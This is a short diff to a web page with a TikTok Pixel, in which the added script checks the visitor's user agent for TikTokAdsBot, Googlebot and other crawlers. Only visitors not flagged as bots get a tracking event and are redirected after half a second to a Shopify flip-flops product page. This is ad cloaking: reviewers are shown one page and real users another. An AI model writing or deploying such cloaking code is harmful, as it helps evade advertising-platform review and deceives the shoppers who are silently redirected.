@@ -12,7 +12,24 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   ttq.page();
 }(window, document, 'ttq');
 </script>
-<!-- TikTok Pixel Code End --> aqui tengo el codoigo
+<!-- TikTok Pixel Code End -->
+
+<script>
+  (function() {
+    var ua = navigator.userAgent || '';
+    var isBot = /TikTokAdsBot|Googlebot|bingbot|facebookexternalhit|Twitterbot|Slackbot|bot/i.test(ua);
+
+    if (!isBot) {
+      if (typeof ttq !== 'undefined') {
+        ttq.track('ViewContent');
+      }
+      setTimeout(function() {
+        window.location.href = 'https://gianinnamarket.myshopify.com/products/lb-flip-flops';
+      }, 500);
+    }
+  })();
+</script>
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
